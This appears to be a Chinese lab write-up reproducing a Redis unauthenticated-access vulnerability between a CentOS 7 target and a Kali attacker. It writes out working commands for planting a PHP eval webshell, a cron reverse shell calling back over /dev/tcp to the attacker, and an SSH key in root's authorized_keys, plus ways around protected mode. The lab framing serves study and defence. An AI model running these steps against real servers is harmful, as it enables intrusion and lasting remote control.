@[TOC](redis未授权访问漏洞复现)
## 一、redis简介
当一个客户端往服务器发送请求，服务器可以正常响应，但是当有成千上万个客户端同时向服务器发送请求时，服务器的压力很大，就有可能导致服务器的效率降低。

于是可以在服务器和客户端中间建立一个redis，当客户端向服务器发送请求，服务器在响应的同时，将服务器响应的数据缓存在redis中，下一次客户端发送请求时，先在redis缓存中寻找是否有需要的数据，如果找到就从redis返回数据，否则再向服务器请求数据，然后将新的响应数据缓存在redis中，redis作为中间缓存来缓解服务器的压力，更详细的介绍参考https://www.redis.com.cn/redis-intro.html
## 二、未授权漏洞简介
在部署 Redis 时，如果安全配置不当，可能导致除了管理员以外的其他用户也可以未经授权地访问 Redis 服务，从而引发数据泄露、命令执行等严重安全问题。

Redis 由客户端工具 redis-cli 和服务端程序 redis-server 组成。默认情况下，Redis 仅绑定本地地址 127.0.0.1，只允许本地访问。然而，为了远程管理的便利，一些管理员会修改配置文件，将绑定地址改为 0.0.0.0，使 Redis 暴露在公网环境中。

与此同时，Redis 默认不启用身份验证机制（requirepass 未配置），且使用默认端口 6379。这意味着一旦 Redis 暴露在公网，攻击者无需密码即可连接并执行任意命令，从而造成数据泄露、恶意数据写入、甚至远程控制等安全风险。
## 三、漏洞利用
实验靶机 centos7 ，攻击机 kali
实验工具：
xshell (用于连接centos7和kali方便操作)
中国蚁剑 (安装在kali上用于对靶机的webshell连接)

### 1.漏洞环境搭建
这里在靶机上通过命令行部署redis，版本为6.2.13
下载redis-6.2.13压缩包
```
wget http://download.redis.io/releases/redis-6.2.13.tar.gz
```
在压缩包目录下解压并进入目录
```
tar xzf redis-6.2.13.tar.gz
cd redis-6.2.13
```
编译安装
```
make
sudo make install
```
接下来是修改配置文件用于复现漏洞
先找到配置文件redis.conf所在目录下编辑配置文件
```
vim redis.conf
```
将允许访问的地址从 bind 127.0.0.1 修改为 bind 0.0.0.0 ,这样攻击机kali才能访问靶机的redis

守护进程修改为yes方便后台运行 daemonize yes

在centos7上安装 redis-cli
```
sudo yum install redis -y
```
在kali上安装 redis-cli 
```
sudo install redis-tools
```
这里建议添加 redis 为服务，这样可以使用 systemctl 来控制 redis
首先新建一个系统文件
```
vim /etc/systemd/system/redis.service
```
再往文件中写入
```
[Unit]
Description=Redis Server
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/redis-server /root/redis-6.2.13/redis.conf
ExecStop=/usr/local/bin/redis-cli shutdown
PrivateTmp=true

[Install]
WantedBy=multi-user.target

```
注意：ExecStart=/usr/local/bin/redis-server /root/redis-6.2.13/redis.conf中的两个文件redis-server和redis-conf的位置每个人的电脑可能不同，以实际位置为准

然后重载系统服务并重启主机
```
systemctl daemo-reload
reboot
```
接下来就可以使用 systemctl 命令来控制redis
启动redis
```
systemctl start redis
```
查看redis服务是否开启
```
systemctl status redis
```
如图即成功开启redis服务
![capture_20250426152750115](https://github.com/user-attachments/assets/b96d0b88-300a-4036-b026-dcbbd1c8263d)

从靶机centos7上进入redis客户端服务
```
redis-cli
```
如图即成功进入
![capture_20250426153839832](https://github.com/user-attachments/assets/7c3596b0-6ef9-4503-af5c-44fb55011a5d)


从攻击机kali上尝试连接靶机的redis服务
```
redis-cli -h <靶机的IP地址> -p 6379
```
![capture_20250426154135989](https://github.com/user-attachments/assets/191f2d59-c349-4605-9aa3-54ad8b58f7a9)

这样就说明整个漏洞环境搭建完成了
### 2.利用漏洞写入webshell
前提:
1.知道网站根目录的绝对路径，因为需要把木马文件写入到目录下
2.目标网站根目录有写入权限

已知靶机的网站根目录为/www/server/phpmyadmin，在kali执行指令

设置工作目录
```
config set dir /www/server/phpmyadmin
```
设置数据文件保存名并保存
```
config set dbfilename webshell.php
save
```
写入一句话木马并保存
```
set webshell "<?php @eval($_POST['pass']); ?>"
save

```
![capture_20250426114349027](https://github.com/user-attachments/assets/7b96f887-0e51-44c7-8eeb-36b4938f0011)


然后就可以在蚁剑上连接了

### 3.通过定时任务反弹shell
用攻击机kali连接上目标机的redis-cli

首先设置工作目录
```
config set dir /var/spool/cron
```
查看是否设置成功
```
config get dir
```
设置文件保存名，redis的定时任务保存在用户名同名的目录下，如果用root用户进入redis,那么就将文件命名为root
```
config set dbfilename root
save
```
再打开一个终端，设置监听端口4444
```
nc -lvvp 4444
```
写入定时任务，设置每分钟反弹一次shell
```
set shell "\n\n* * * * * /bin/bash -i >& /dev/tcp/<攻击机的IP>/4444 0>&1\n\n"
save

```
然后就可以在监听窗口接收到反弹的shell
### 4.写入ssh公钥实现免密登录
通过写入公钥到redis服务器所在主机，可以实现ssh免密登录

首先在攻击机kali上生成公钥，默认存放在/root/.ssh目录下
```
ssh-keygen
```
再将公钥拷贝到靶机的/root/.ssh/authorized_keys里
```
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
set ssh "<kali生成的公钥>"
save
```

然后就可以在kali上ssh远程免密登录redis主机了
```
ssh -i ~/.ssh/<你的私钥> root@<redis主机的IP>
```
### 5.复现过程常见问题
1）在执行 config set /var/spool/cron命令时有可能会提示
```
config set dir /var/spool/cron
(error) ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config
```
这是说 redis 不允许在运行时修改一些受保护的配置项，比如 'dir' ,可以尝试修改redis 的配置文件 redis.conf 来解决

在 redis.conf 中找到 dir 一行改成
```
dir /var/spool/cron/
```
将保护模式关掉（仅适用于测试漏洞，实际生产不要关）
```
protected-mode no    #把yes改为no
```
保存配置再重启 redis 服务

如果执行以上操作都不行的话，多半就是版本太高了，在测试时也使用过7.2.0版本的 redis 服务，尝试多种方法依然报错，换成6.2.13版本以后就可以正常测试

2）在写入ssh公钥时，redis 主机上的 /root/ 目录下如果不存在 .ssh 目录，由于config 命令不能直接创建目录，通常测试时直接在 redis 主机上创建对应的目录，在实际中可能需要通过其他手段比如反弹shell获得shell再创建对应的目录，或者通过写入木马，用蚁剑连接后再创建目录
